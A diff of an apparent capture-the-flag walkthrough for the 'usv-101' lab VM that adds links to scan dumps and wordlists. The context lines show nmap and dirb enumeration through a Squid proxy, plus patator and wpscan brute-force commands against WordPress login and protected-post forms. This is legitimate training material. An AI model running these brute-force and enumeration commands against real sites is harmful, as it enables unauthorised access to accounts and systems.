@@ -5,7 +5,7 @@ $ netdiscover -r 192.168.190.0/24 -i vmnet1
 
 $ nmap -p 1-65535 -T4 -A -v 192.168.190.132
 -- You can see the nmap dump here
-
+https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/scan/USV.nmap
 ==========================================================================================
 ssh root@192.168.190.132
 
@@ -54,8 +54,8 @@ Squid proxy is active and running on the server (From Nmap results)
 using Squid http proxy on port 3129 on firefox and then access the webserver
 then using dirb to extract files on the server
 $ dirb http://192.168.190.132 -R -o dirb.txt -p 192.168.190.132:3129
--- You can see the dirb dump in scan folder
-
+-- You can see the dirb dump here
+https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/scan/dirb.txt
 then tried to access /blog via proxy and i got wordpress then clicked on i have a message for you
 then i navigated to /blog/hodor and gave me a zip file . after extraction
 
@@ -66,6 +66,8 @@ at the end of the blog page there is Protected: The secret Chapter
 i tried to extract all words of this page and put it in one file and use it as wordlist
 cewl --proxy_host 192.168.190.132 --proxy_port 3129 http://192.168.190.132/blog/ > words.lst
 
+//You can find it here
+https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/wordlists/words.lst
 the use patator to brute force or you can use burpsuite
 
 $patator http_fuzz http_proxy=192.168.190.132:3129 url='http://192.168.190.132/blog/wp-login.php?action=postpass' method=POST header='Referer: "http://192.168.190.132/blog/index.php/2016/10/16/the-secret-chapter/"' body='post_password=FILE0&Submit=Enter' 0=words.lst -x ignore:fgrep='post-password-form' follow=1 accept_cookie=1
@@ -96,6 +98,8 @@ i generated 2 wordlists as password one with capital initials and one with not
 $ crunch 1 1 -p Rhaegal Viserion Drogon > wordpress.pass
 $ crunch 1 1 -p rhaegal viserion drogon > wordpress2.pass
 
+//you can find it here
+https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/wordlists/wordpress.pass
 then i tried brute force using wpscan
 $ wpscan --proxy 192.168.190.132:3129 --url http://192.168.190.132/blog/ --wordlist wordpress.pass --username mother_of_dragons
 
